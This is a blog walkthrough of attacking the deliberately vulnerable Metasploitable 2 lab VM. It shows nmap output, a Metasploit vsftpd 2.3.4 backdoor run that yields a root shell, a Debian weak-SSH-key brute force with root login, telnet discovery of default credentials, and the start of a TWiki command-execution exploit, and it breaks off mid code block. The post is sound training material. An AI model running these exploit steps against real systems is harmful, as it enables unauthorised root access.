
<!DOCTYPE html>
<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
<head>
  <meta charset="utf-8">
  <title>Pentest lab - Metasploitable 2 - Core dump overflow</title>
  <meta name="author" content="chousensha">

  
  
  <meta name="description" content="Penetration testing Metasploitable">
  <meta name="keywords" content="metasploitable, metasploit, penetration testing, hacking, security, metasploitable 2, metasploitable writeup, metasploitable walkthrough, hacking metasploitable, metasploitable tutorial, metasploitable 2 exploits, metasploitable 2 writeup, metasploitable 2 walkthrough, metasploitable 2 tutorial">
  

  <!-- http://t.co/dKP3o1e -->
  <meta name="HandheldFriendly" content="True">
  <meta name="MobileOptimized" content="320">
  <meta name="viewport" content="width=device-width, initial-scale=1">

  
  <link rel="canonical" href="http://chousensha.github.io/blog/2014/06/03/pentest-lab-metasploitable-2">
  <link href="/favicon.png" rel="icon">
  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
  <link href="/atom.xml" rel="alternate" title="Core dump overflow" type="application/atom+xml">
  <script src="/javascripts/modernizr-2.0.js"></script>
  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
  <script>!window.jQuery && document.write(unescape('%3Cscript src="./javascripts/libs/jquery.min.js"%3E%3C/script%3E'))</script>
  <script src="/javascripts/octopress.js" type="text/javascript"></script>
  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
<link href="//fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
<link href="//fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">

  
  <script type="text/javascript">
    var _gaq = _gaq || [];
    _gaq.push(['_setAccount', 'UA-51216602-2']);
    _gaq.push(['_trackPageview']);

    (function() {
      var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
      ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
      var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
    })();
  </script>


</head>

<body   >
  <header role="banner"><hgroup>
  <h1><a href="/">Core dump overflow</a></h1>
  
    <h2>Core dump in progress...</h2>
  
</hgroup>

</header>
  <nav role="navigation"><ul class="subscription" data-subscription="rss">
  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
  
</ul>
  
<form action="https://www.google.com/search" method="get">
  <fieldset role="search">
    <input type="hidden" name="q" value="site:chousensha.github.io" />
    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
  </fieldset>
</form>
  
<ul class="main-navigation">
  <li><a href="/">Blog</a></li>
  <li><a href="/where-to-start">Where to start</a></li>
  <li><a href="/book-corner">Book corner</a></li>
  <li><a href="/blog/archives">Archives</a></li>
</ul>

</nav>
  <div id="main">
    <div id="content">
      <div>
<article class="hentry" role="article">
  
  <header>
    
      <h1 class="entry-title">Pentest lab - Metasploitable 2</h1>
    
    
      <p class="meta">
        








  


<time datetime="2014-06-03T14:16:09-04:00" pubdate data-updated="true">Jun 3<span>rd</span>, 2014</time>
        
           | <a href="#disqus_thread"
             data-disqus-identifier="http://chousensha.github.io">Comments</a>
        
      </p>
    
  </header>


<div class="entry-content"><p>Today I will walk through different ways of exploiting Metasploitable 2, the newer release of Rapid7&rsquo;s popular vulnerable machine. First, what is Metasploitable?</p>

<!-- more -->


<blockquote><p>Metasploitable is an intentionally vulnerable Linux virtual machine. This VM can be
used to conduct security training, test security tools, and practice common
penetration testing techniques.</p></blockquote>

<p>In my lab environment, the IP of the attacker machine is 192.168.127.159, and the victim machine is 192.168.127.154.</p>

<p>Since this is a test lab, I won&rsquo;t be concerned about stealth. Instead, I will try to get the most information out of the scans.</p>

<p>Let&rsquo;s start by port scanning the target with nmap. I did a full port, aggresive scan against the target. Here are the results.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
<span class='line-number'>87</span>
<span class='line-number'>88</span>
<span class='line-number'>89</span>
<span class='line-number'>90</span>
<span class='line-number'>91</span>
<span class='line-number'>92</span>
<span class='line-number'>93</span>
<span class='line-number'>94</span>
<span class='line-number'>95</span>
<span class='line-number'>96</span>
<span class='line-number'>97</span>
<span class='line-number'>98</span>
<span class='line-number'>99</span>
<span class='line-number'>100</span>
<span class='line-number'>101</span>
<span class='line-number'>102</span>
<span class='line-number'>103</span>
<span class='line-number'>104</span>
<span class='line-number'>105</span>
<span class='line-number'>106</span>
<span class='line-number'>107</span>
<span class='line-number'>108</span>
<span class='line-number'>109</span>
<span class='line-number'>110</span>
<span class='line-number'>111</span>
<span class='line-number'>112</span>
<span class='line-number'>113</span>
<span class='line-number'>114</span>
<span class='line-number'>115</span>
<span class='line-number'>116</span>
<span class='line-number'>117</span>
<span class='line-number'>118</span>
<span class='line-number'>119</span>
<span class='line-number'>120</span>
<span class='line-number'>121</span>
<span class='line-number'>122</span>
<span class='line-number'>123</span>
<span class='line-number'>124</span>
<span class='line-number'>125</span>
<span class='line-number'>126</span>
<span class='line-number'>127</span>
<span class='line-number'>128</span>
<span class='line-number'>129</span>
<span class='line-number'>130</span>
<span class='line-number'>131</span>
<span class='line-number'>132</span>
<span class='line-number'>133</span>
<span class='line-number'>134</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nmap -p1-65535 -A 192.168.127.154
</span><span class='line'>
</span><span class='line'>Starting Nmap 6.46 ( http://nmap.org ) at 2014-06-03 21:33 EEST
</span><span class='line'>Nmap scan report for 192.168.127.154
</span><span class='line'>Host is up (0.00047s latency).
</span><span class='line'>Not shown: 65505 closed ports
</span><span class='line'>PORT      STATE SERVICE     VERSION
</span><span class='line'>21/tcp    open  ftp         vsftpd 2.3.4
</span><span class='line'>|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
</span><span class='line'>22/tcp    open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
</span><span class='line'>| ssh-hostkey: 
</span><span class='line'>|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
</span><span class='line'>|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
</span><span class='line'>23/tcp    open  telnet      Linux telnetd
</span><span class='line'>25/tcp    open  smtp        Postfix smtpd
</span><span class='line'>|_smtp-commands: metasploitable.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, 
</span><span class='line'>| ssl-cert: Subject: commonName=ubuntu804-base.localdomain/organizationName=OCOSA/stateOrProvinceName=There is no such thing outside US/countryName=XX
</span><span class='line'>| Not valid before: 2010-03-17T14:07:45+00:00
</span><span class='line'>|_Not valid after:  2010-04-16T13:07:45+00:00
</span><span class='line'>|_ssl-date: 2014-06-03T18:35:26+00:00; -1s from local time.
</span><span class='line'>53/tcp    open  domain      ISC BIND 9.4.2
</span><span class='line'>| dns-nsid: 
</span><span class='line'>|_  bind.version: 9.4.2
</span><span class='line'>80/tcp    open  http        Apache httpd 2.2.8 ((Ubuntu) DAV/2)
</span><span class='line'>|_http-methods: No Allow or Public header in OPTIONS response (status code 200)
</span><span class='line'>|_http-title: Metasploitable2 - Linux
</span><span class='line'>111/tcp   open  rpcbind     2 (RPC #100000)
</span><span class='line'>| rpcinfo: 
</span><span class='line'>|   program version   port/proto  service
</span><span class='line'>|   100000  2            111/tcp  rpcbind
</span><span class='line'>|   100000  2            111/udp  rpcbind
</span><span class='line'>|   100003  2,3,4       2049/tcp  nfs
</span><span class='line'>|   100003  2,3,4       2049/udp  nfs
</span><span class='line'>|   100005  1,2,3      46385/tcp  mountd
</span><span class='line'>|   100005  1,2,3      47809/udp  mountd
</span><span class='line'>|   100021  1,3,4      47120/udp  nlockmgr
</span><span class='line'>|   100021  1,3,4      53013/tcp  nlockmgr
</span><span class='line'>|   100024  1          34130/tcp  status
</span><span class='line'>|_  100024  1          45305/udp  status
</span><span class='line'>139/tcp   open  netbios-ssn Samba smbd 3.X (workgroup: WORKGROUP)
</span><span class='line'>445/tcp   open  netbios-ssn Samba smbd 3.X (workgroup: WORKGROUP)
</span><span class='line'>512/tcp   open  exec        netkit-rsh rexecd
</span><span class='line'>513/tcp   open  login?
</span><span class='line'>514/tcp   open  tcpwrapped
</span><span class='line'>1099/tcp  open  java-rmi    Java RMI Registry
</span><span class='line'>1524/tcp  open  shell       Metasploitable root shell
</span><span class='line'>2049/tcp  open  nfs         2-4 (RPC #100003)
</span><span class='line'>| rpcinfo: 
</span><span class='line'>|   program version   port/proto  service
</span><span class='line'>|   100000  2            111/tcp  rpcbind
</span><span class='line'>|   100000  2            111/udp  rpcbind
</span><span class='line'>|   100003  2,3,4       2049/tcp  nfs
</span><span class='line'>|   100003  2,3,4       2049/udp  nfs
</span><span class='line'>|   100005  1,2,3      46385/tcp  mountd
</span><span class='line'>|   100005  1,2,3      47809/udp  mountd
</span><span class='line'>|   100021  1,3,4      47120/udp  nlockmgr
</span><span class='line'>|   100021  1,3,4      53013/tcp  nlockmgr
</span><span class='line'>|   100024  1          34130/tcp  status
</span><span class='line'>|_  100024  1          45305/udp  status
</span><span class='line'>2121/tcp  open  ftp         ProFTPD 1.3.1
</span><span class='line'>3306/tcp  open  mysql       MySQL 5.0.51a-3ubuntu5
</span><span class='line'>| mysql-info: 
</span><span class='line'>|   Protocol: 53
</span><span class='line'>|   Version: .0.51a-3ubuntu5
</span><span class='line'>|   Thread ID: 8
</span><span class='line'>|   Capabilities flags: 43564
</span><span class='line'>|   Some Capabilities: ConnectWithDatabase, SwitchToSSLAfterHandshake, Support41Auth, SupportsTransactions, Speaks41ProtocolNew, SupportsCompression, LongColumnFlag
</span><span class='line'>|   Status: Autocommit
</span><span class='line'>|_  Salt: (eFoz:O^m'yLR5Qw&RJ\
</span><span class='line'>3632/tcp  open  distccd     distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
</span><span class='line'>5432/tcp  open  postgresql  PostgreSQL DB 8.3.0 - 8.3.7
</span><span class='line'>5900/tcp  open  vnc         VNC (protocol 3.3)
</span><span class='line'>| vnc-info: 
</span><span class='line'>|   Protocol version: 3.3
</span><span class='line'>|   Security types: 
</span><span class='line'>|_    Unknown security type (33554432)
</span><span class='line'>6000/tcp  open  X11         (access denied)
</span><span class='line'>6667/tcp  open  irc         Unreal ircd
</span><span class='line'>| irc-info: 
</span><span class='line'>|   server: irc.Metasploitable.LAN
</span><span class='line'>|   version: Unreal3.2.8.1. irc.Metasploitable.LAN 
</span><span class='line'>|   servers: 1
</span><span class='line'>|   users: 1
</span><span class='line'>|   lservers: 0
</span><span class='line'>|   lusers: 1
</span><span class='line'>|   uptime: 0 days, 0:07:28
</span><span class='line'>|   source host: 7FA0EA81.B1DFC955.FFFA6D49.IP
</span><span class='line'>|_  source ident: nmap
</span><span class='line'>6697/tcp  open  irc         Unreal ircd
</span><span class='line'>8009/tcp  open  ajp13?
</span><span class='line'>| ajp-auth: 
</span><span class='line'>|_  ERROR: Failed to connect to AJP server
</span><span class='line'>| ajp-methods: 
</span><span class='line'>|_  ERROR: Failed to connect to server
</span><span class='line'>8180/tcp  open  http        Apache Tomcat/Coyote JSP engine 1.1
</span><span class='line'>8787/tcp  open  drb         Ruby DRb RMI (Ruby 1.8; path /usr/lib/ruby/1.8/drb)
</span><span class='line'>34130/tcp open  status      1 (RPC #100024)
</span><span class='line'>46385/tcp open  mountd      1-3 (RPC #100005)
</span><span class='line'>50867/tcp open  unknown
</span><span class='line'>53013/tcp open  nlockmgr    1-4 (RPC #100021)
</span><span class='line'>| rpcinfo: 
</span><span class='line'>|   program version   port/proto  service
</span><span class='line'>|   100000  2            111/tcp  rpcbind
</span><span class='line'>|   100000  2            111/udp  rpcbind
</span><span class='line'>|   100003  2,3,4       2049/tcp  nfs
</span><span class='line'>|   100003  2,3,4       2049/udp  nfs
</span><span class='line'>|   100005  1,2,3      46385/tcp  mountd
</span><span class='line'>|   100005  1,2,3      47809/udp  mountd
</span><span class='line'>|   100021  1,3,4      47120/udp  nlockmgr
</span><span class='line'>|   100021  1,3,4      53013/tcp  nlockmgr
</span><span class='line'>|   100024  1          34130/tcp  status
</span><span class='line'>|_  100024  1          45305/udp  status
</span><span class='line'>MAC Address: 00:0C:29:2E:6D:70 (VMware)
</span><span class='line'>Device type: general purpose
</span><span class='line'>Running: Linux 2.6.X
</span><span class='line'>OS CPE: cpe:/o:linux:linux_kernel:2.6
</span><span class='line'>OS details: Linux 2.6.9 - 2.6.33
</span><span class='line'>Network Distance: 1 hop
</span><span class='line'>Service Info: Hosts:  metasploitable.localdomain, localhost, irc.Metasploitable.LAN; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
</span><span class='line'>
</span><span class='line'>Host script results:
</span><span class='line'>|_nbstat: NetBIOS name: METASPLOITABLE, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)
</span><span class='line'>| smb-os-discovery: 
</span><span class='line'>|   OS: Unix (Samba 3.0.20-Debian)
</span><span class='line'>|   NetBIOS computer name: 
</span><span class='line'>|   Workgroup: WORKGROUP
</span><span class='line'>|_  System time: 2014-06-03T14:35:26-04:00
</span><span class='line'>
</span><span class='line'>TRACEROUTE
</span><span class='line'>HOP RTT     ADDRESS
</span><span class='line'>1   0.47 ms 192.168.127.154
</span><span class='line'>
</span><span class='line'>OS and Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .
</span><span class='line'>Nmap done: 1 IP address (1 host up) scanned in 284.64 seconds</span></code></pre></td></tr></table></div></figure>


<p>Ok, there are plenty of services just waiting for our attention. So let&rsquo;s check each port and see what we get.</p>

<h3>Port 21 vsftpd</h3>

<p>There is an exploit available in Metasploit for the vsftpd version.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msf &gt; search vsftpd
</span><span class='line'>
</span><span class='line'>Matching Modules
</span><span class='line'>================
</span><span class='line'>
</span><span class='line'>   Name                                  Disclosure Date  Rank       Description
</span><span class='line'>   ----                                  ---------------  ----       -----------
</span><span class='line'>   exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03       excellent  VSFTPD v2.3.4 Backdoor Command Execution</span></code></pre></td></tr></table></div></figure>


<p>The description from Rapid7 site:</p>

<p><strong>VSFTPD v2.3.4 Backdoor Command Execution</strong></p>

<blockquote><p>This module exploits a malicious backdoor that was added to the VSFTPD download archive. This backdoor was introduced into the
vsftpd-2.3.4.tar.gz archive between June 30th 2011 and July 1st 2011 according to the most recent information available. This backdoor was
removed on July 3rd 2011.</p></blockquote>

<p>Let&rsquo;s leverage it and get a shell:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msf &gt; use exploit/unix/ftp/vsftpd_234_backdoor
</span><span class='line'>msf exploit(vsftpd_234_backdoor) &gt; show options
</span><span class='line'>
</span><span class='line'>Module options (exploit/unix/ftp/vsftpd_234_backdoor):
</span><span class='line'>
</span><span class='line'>   Name   Current Setting  Required  Description
</span><span class='line'>   ----   ---------------  --------  -----------
</span><span class='line'>   RHOST                   yes       The target address
</span><span class='line'>   RPORT  21               yes       The target port
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>Exploit target:
</span><span class='line'>
</span><span class='line'>   Id  Name
</span><span class='line'>   --  ----
</span><span class='line'>   0   Automatic
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>msf exploit(vsftpd_234_backdoor) &gt; set RHOST 192.168.127.154
</span><span class='line'>RHOST =&gt; 192.168.127.154
</span><span class='line'>msf exploit(vsftpd_234_backdoor) &gt; show payloads
</span><span class='line'>
</span><span class='line'>Compatible Payloads
</span><span class='line'>===================
</span><span class='line'>
</span><span class='line'>   Name               Disclosure Date  Rank    Description
</span><span class='line'>   ----               ---------------  ----    -----------
</span><span class='line'>   cmd/unix/interact                   normal  Unix Command, Interact with Established Connection
</span><span class='line'>
</span><span class='line'>msf exploit(vsftpd_234_backdoor) &gt; set payload cmd/unix/interact
</span><span class='line'>payload =&gt; cmd/unix/interact
</span><span class='line'>msf exploit(vsftpd_234_backdoor) &gt; show options
</span><span class='line'>
</span><span class='line'>Module options (exploit/unix/ftp/vsftpd_234_backdoor):
</span><span class='line'>
</span><span class='line'>   Name   Current Setting  Required  Description
</span><span class='line'>   ----   ---------------  --------  -----------
</span><span class='line'>   RHOST  192.168.127.154  yes       The target address
</span><span class='line'>   RPORT  21               yes       The target port
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>Payload options (cmd/unix/interact):
</span><span class='line'>
</span><span class='line'>   Name  Current Setting  Required  Description
</span><span class='line'>   ----  ---------------  --------  -----------
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>Exploit target:
</span><span class='line'>
</span><span class='line'>   Id  Name
</span><span class='line'>   --  ----
</span><span class='line'>   0   Automatic
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>msf exploit(vsftpd_234_backdoor) &gt; exploit
</span><span class='line'>
</span><span class='line'>[*] Banner: 220 (vsFTPd 2.3.4)
</span><span class='line'>[*] USER: 331 Please specify the password.
</span><span class='line'>[+] Backdoor service has been spawned, handling...
</span><span class='line'>[+] UID: uid=0(root) gid=0(root)
</span><span class='line'>[*] Found shell.
</span><span class='line'>[*] Command shell session 1 opened (192.168.127.159:57936 -&gt; 192.168.127.154:6200) at 2014-06-03 22:42:36 +0300
</span><span class='line'>
</span><span class='line'>whoami
</span><span class='line'>root
</span><span class='line'>uname -a
</span><span class='line'>Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux</span></code></pre></td></tr></table></div></figure>


<p>Aaand we own the machine! Now let&rsquo;s move on.</p>

<h3>Port 22 ssh</h3>

<p>The OpenSSL package installed on the system is vulnerable to a bruteforce exploit  due to a random number generator weakness. Here&rsquo;s the overview and the CVE number:</p>

<p><strong>CVE-2008-0166</strong></p>

<blockquote><p>OpenSSL 0.9.8c-1 up to versions before 0.9.8g-9 on Debian-based operating systems uses a random number generator that generates predictable > numbers, which makes it easier for remote attackers to conduct brute force guessing attacks against cryptographic keys.</p></blockquote>

<p>I chose the following Ruby exploit:</p>

<p><a href="http://www.exploit-db.com/exploits/5632/">http://www.exploit-db.com/exploits/5632/</a></p>

<p>Before running it, you have to download the precalculated vulnerable keys from:</p>

<p><a href="http://www.exploit-db.com/sploits/debian_ssh_dsa_1024_x86.tar.bz2">http://www.exploit-db.com/sploits/debian_ssh_dsa_1024_x86.tar.bz2</a>  # for dsa keys</p>

<p><a href="http://www.exploit-db.com/sploits/debian_ssh_rsa_2048_x86.tar.bz2">http://www.exploit-db.com/sploits/debian_ssh_rsa_2048_x86.tar.bz2</a> # for rsa keys</p>

<p>Then I ran the script as follows:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>ruby ./5632.rb 192.168.127.154 root ~/rsa/2048/</span></code></pre></td></tr></table></div></figure>


<p>You can consult the source for more information, basically this checks if the root account has a weak SSH key, testing each key in the directory where you placed the keys. Upon a hit, you will see something like this:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>KEYFILE FOUND:
</span><span class='line'>
</span><span class='line'>57c3115d77c56390332dc5c49978627a-5429</span></code></pre></td></tr></table></div></figure>


<p>After finding the key, you can use it to log in as root via ssh:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>ssh -l root -p 22 -i 57c3115d77c56390332dc5c49978627a-5429 192.168.127.154</span></code></pre></td></tr></table></div></figure>


<h3>Port 23 telnet</h3>

<p>For this one I used an auxiliary module:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msf &gt; use auxiliary/scanner/telnet/telnet_version
</span><span class='line'>msf auxiliary(telnet_version) &gt; show options
</span><span class='line'>
</span><span class='line'>Module options (auxiliary/scanner/telnet/telnet_version):
</span><span class='line'>
</span><span class='line'>   Name      Current Setting  Required  Description
</span><span class='line'>   ----      ---------------  --------  -----------
</span><span class='line'>   PASSWORD                   no        The password for the specified username
</span><span class='line'>   RHOSTS                     yes       The target address range or CIDR identifier
</span><span class='line'>   RPORT     23               yes       The target port
</span><span class='line'>   THREADS   1                yes       The number of concurrent threads
</span><span class='line'>   TIMEOUT   30               yes       Timeout for the Telnet probe
</span><span class='line'>   USERNAME                   no        The username to authenticate as
</span><span class='line'>
</span><span class='line'>msf auxiliary(telnet_version) &gt; set RHOSTS 192.168.127.154
</span><span class='line'>RHOSTS =&gt; 192.168.127.154
</span><span class='line'>msf auxiliary(telnet_version) &gt; run
</span><span class='line'>
</span><span class='line'>[*] 192.168.127.154:23 TELNET _                  _       _ _        _     _      ____  \x0a _ __ ___   ___| |_ __ _ ___ _ __ | | ___ (_) |_ __ _| |__ | | ___|___ \ \x0a| '_ ` _ \ / _ \ __/ _` / __| '_ \| |/ _ \| | __/ _` | '_ \| |/ _ \ __) |\x0a| | | | | |  __/ || (_| \__ \ |_) | | (_) | | || (_| | |_) | |  __// __/ \x0a|_| |_| |_|\___|\__\__,_|___/ .__/|_|\___/|_|\__\__,_|_.__/|_|\___|_____|\x0a                            |_|                                          \x0a\x0a\x0aWarning: Never expose this VM to an untrusted network!\x0a\x0aContact: msfdev[at]metasploit.com\x0a\x0aLogin with msfadmin/msfadmin to get started\x0a\x0a\x0ametasploitable login:
</span><span class='line'>[*] Scanned 1 of 1 hosts (100% complete)
</span><span class='line'>[*] Auxiliary module execution completed</span></code></pre></td></tr></table></div></figure>


<p>So now we know the credentials for the msfadmin account, and if you log in and play around you will find out that this accound has sudo privilege, so it&rsquo;s possible to run commands as root.</p>

<h3>Port 80 apache</h3>

<p>Navigating to the root of the web server, we can see some vulnerable web applications, along with the msfadmin account details which we got earlier with telnet. I won&rsquo;t go over the web applications here, because I am focusing on host based exploitation in this post. However, I found out that I could use Metasploit against one of them to get a shell, so I will detail that here.</p>

<p>The Nessus scan revealed that the TWiki web application is vulnerable to remote code execution. I found the following suitable exploit:</p>

<p><strong>TWiki History TWikiUsers rev Parameter Command Execution</strong></p>

<blockquote><p>This module exploits a vulnerability in the history component of TWiki. By passing a &lsquo;rev&rsquo; parameter containing shell metacharacters to the
TWikiUsers script, an attacker can execute arbitrary OS commands.</p></blockquote>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
